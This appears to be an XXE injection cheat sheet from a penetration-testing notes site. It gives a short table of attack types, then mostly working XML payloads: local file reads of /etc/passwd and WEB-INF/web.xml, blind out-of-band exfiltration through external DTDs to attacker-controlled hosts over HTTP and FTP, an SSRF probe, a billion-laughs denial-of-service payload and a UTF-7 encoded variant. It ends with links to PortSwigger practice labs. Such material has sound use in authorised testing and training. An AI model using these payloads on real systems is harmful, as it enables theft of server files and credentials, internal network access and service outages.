**There are various types of XXE attacks:**

|   |   |
|---|---|
|XXE Attack Type|Description|
|Exploiting XXE to Retrieve Files|Where an external entity is defined containing the contents of a file, and returned in the application's response.|
|Exploiting XXE to Perform SSRF Attacks|Where an external entity is defined based on a URL to a back-end system.|
|Exploiting Blind XXE Exfiltrate Data Out-of-Band|Where sensitive data is transmitted from the application server to a system that the attacker controls.|
|Exploiting blind XXE to Retrieve Data Via Error Messages|Where the attacker can trigger a parsing error message containing sensitive data.|

## Test Payload[#](https://trojand.com/cheatsheet/Web/XXE_Injection.html#test-payload)

### Using private External Entity[#](https://trojand.com/cheatsheet/Web/XXE_Injection.html#using-private-external-entity)

```
<?xml version="1.0" ?><!DOCTYPE data [<!ELEMENT data ANY ><!ENTITY cat "Tom">]><Contact><lastName>&cat;</lastName><firstName>Jerry</firstName></Contact>
```

### Using a public External Entity[#](https://trojand.com/cheatsheet/Web/XXE_Injection.html#using-a-public-external-entity)

```
<?xml version="1.0"?><!DOCTYPE data [	<!ELEMENT data ANY >	<!ENTITY cat SYSTEM "file:///etc/passwd">]><Contact><lastName>&cat;</lastName><firstName>Jerry</firstName></Contact>
```

## CDATA[#](https://trojand.com/cheatsheet/Web/XXE_Injection.html#cdata)

- XXE that can print XML files through the CDATA:
    
    ```
    <?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY ><!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///var/www/html/myapp/WEB-INF/web.xml" ><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://192.168.1.5:8000/wrapper.dtd" >%dtd;]><Contact><lastName>&wrapper;</lastName><firstName>FIRSTNAME_FILLER</firstName></Contact>
    ```
    
- Inside the `wrapper.dtd` (the external DTD file)
    
    - Its purpose is just to wrap the variables(parameters) into
    
    ```
    <!ENTITY wrapper "%start;%file;%end;">
    ```
    

- **==Exploitation==**
    
    **LFI Test**
    
    ```
    <?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo (\#ANY)><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
    ```
    
    **Blind LFI test (when first case doesn't return anything)**
    
    ```
    <?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo (\#ANY)><!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
    ```
    
    **Access Control bypass (loading restricted resources - PHP example)**
    
    ```
    <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]><foo><result>&ac;</result></foo>
    ```
    
    **SSRF Test**
    
    ```
    <?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo (\#ANY)><!ENTITY xxe SYSTEM "<https://www.example.com/text.txt>">]><foo>&xxe;</foo>
    ```
    
    **XEE (XML Entity Expansion - DOS)**
    
    ```
    <?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (\#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>
    ```
    
    **XEE \#2 (Remote attack - through external xml inclusion)**
    
    ```
    <?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY test SYSTEM "<https://example.com/entity1.xml>">]><lolz><lol>3..2..1...&test<lol></lolz>
    ```
    
    **XXE FTP HTTP Server**
    
    [https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)
    
    [http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html)
    
    ```
    <!DOCTYPE data [<!ENTITY % remote SYSTEM "<http://publicServer.com/parameterEntity_sendftp.dtd>">%remote;%send;]><data>4</data>File stored on <http://publicServer.com/parameterEntity_sendftp.dtd><!ENTITY % param1 "<!ENTITY &\#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">%param1;
    ```
    
    **XXE UTF-7**
    
    ```
    <?xml version="1.0" encoding="UTF-7"?>+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA++ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
    ```
    
    To convert between UTF-8 & UTF-7 use recode.  
    `recode UTF8..UTF7 payload-file.xml`
    

- [ ] [**Blind XXE with out-of-band interaction**](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
- [ ] [**Exploiting blind XXE to exfiltrate data using a malicious external DTD**](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
- [ ] [**Blind XXE with out-of-band interaction via XML parameter entities**](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
- [ ] [**Exploiting blind XXE to retrieve data via error messages**](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages) **[ DTD Blind Out-of-band ]**
- [ ] [**Exploiting XInclude to retrieve files**](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
- [ ] [PortSwigger Lab: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
- [ ] [**Exploiting XXE to retrieve data by repurposing a local DTD**](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)